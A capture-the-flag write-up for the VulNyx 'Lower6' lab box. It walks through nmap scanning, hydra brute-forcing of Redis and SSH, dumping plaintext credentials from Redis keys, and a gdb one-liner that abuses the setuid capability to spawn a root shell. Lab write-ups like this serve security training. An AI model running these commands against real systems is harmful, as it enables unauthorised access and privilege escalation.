---
title: VulNyx - Lower6 Writeup
date: 2025-05-26 17:00:00 +0530
categories: [Vulnyx, Writeups]
tags: [linux, redis, setuid, privesc]
description: 
---

`Lower6` is a low difficulty linux box. This machine consists of brute-forcing a redis instance as well as SSH, dumping the redis database keys, and finally privilege escalation by abusing the `setuid` capability enabled in the `gdb` binary.

## Enumeration

### Port Scanning

Performing a basic port scan and service enumeration with `nmap` gives us the following 

```bash
nmap -p- lower6.vl  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 05:55 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for lower6.vl (192.168.25.13)
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
6379/tcp open  redis
MAC Address: 08:00:27:2D:DD:BB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds
```

```bash
nmap -p 22,6379 -sC -sV lower6.vl
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 05:56 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for lower6.vl (192.168.25.13)
Host is up (0.00025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
6379/tcp open  redis   Redis key-value store
MAC Address: 08:00:27:2D:DD:BB (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.55 seconds
```

As we can see we have OpenSSH running on port `22` and a Redis key-value store running on port `6379` 

### Port 6379 - Redis key-value store

Redis is an in-memory database. When we attempt to connect to the redis instance we see that anonymous connections are are not allowed, i.e., authentication is required.

```bash
redis-cli -h lower6.vl -p 6379
lower6.vl:6379> info
NOAUTH Authentication required.
```

We first attempted some common credentials like `admin:admin`, `admin:password`, and `root:root` which were unsuccessful. 

#### Redis Brute-force

We next attempted to brute-force credentials for the redis instance using `hydra` 

```bash
hydra -P rockyou.txt -f redis://192.168.25.13 -t 64
```

![image.png](/assets/img/lower6_writeup/image.png)

We discovered a valid password, i.e., `hellow` and used it to login to the redis service by assuming that only a password was configured in the redis instance.

> **Note:** Redis allows the configuration of either username + password or only a password. If only a password is configured the username used would be “default”.
{: .prompt-info }

![image.png](/assets/img/lower6_writeup/image%201.png)

### Redis Enumeration (Authenticated)

We first used the `INFO keyspace` command to obtain database related statistics. We can see that `db0` contains `5` keys.

![image.png](/assets/img/lower6_writeup/image%202.png)

## Dumping db0

By dumping `db0` we can see that it seems to contain credentials.

```bash
lower6.vl:6379> INFO keyspace
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
lower6.vl:6379> SELECT 0
OK
lower6.vl:6379> KEYS *
1) "key2"
2) "key5"
3) "key4"
4) "key3"
5) "key1"
lower6.vl:6379> GET key2
"ghost:Ghost!Hunter42"
lower6.vl:6379> GET key5
"shadow:ShadowMaze@9"
lower6.vl:6379> GET key4
"wolf:CyberWolf#21"
lower6.vl:6379> GET key3
"snake:Pixel_Sn4ke77"
lower6.vl:6379> GET key1
"killer:K!ll3R123"
```

#### Dumped keys

**creds.txt**

```
ghost:Ghost!Hunter42
shadow:ShadowMaze@9
wolf:CyberWolf#21
snake:Pixel_Sn4ke77
killer:K!ll3R123
```

## Brute-forcing SSH

Next we prepare a username and password wordlist with keys dumped, to be used with hydra to brute-force SSH which lead to the discovery of a valid username and password combination, i.e., `killer:ShadowMaze@9`

```bash
cut -f1 -d ":" creds.txt > users.txt                                                                                                                         
```

```bash
cut -f2 -d ":" creds.txt > passwords.txt
```

![image.png](/assets/img/lower6_writeup/image%203.png)

### User flag

![image.png](/assets/img/lower6_writeup/image%204.png)

## Privilege escalation

### linpeas.sh

We then used LinPEAS to look for possible paths to escalate privileges. We can see that the `gdb` binary has set user identity (`setuid`) capabilities which we can potentially use to escalate privileges by using it as backdoor to maintain privileged access by manipulating its own process UID.

```bash
scp linpeas.sh killer@lower6.vl:/home/killer/
```

![image.png](/assets/img/lower6_writeup/image%205.png)

```bash
killer@lower6:~$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

![image.png](/assets/img/lower6_writeup/image%206.png)

### Root flag

![image.png](/assets/img/lower6_writeup/image%207.png)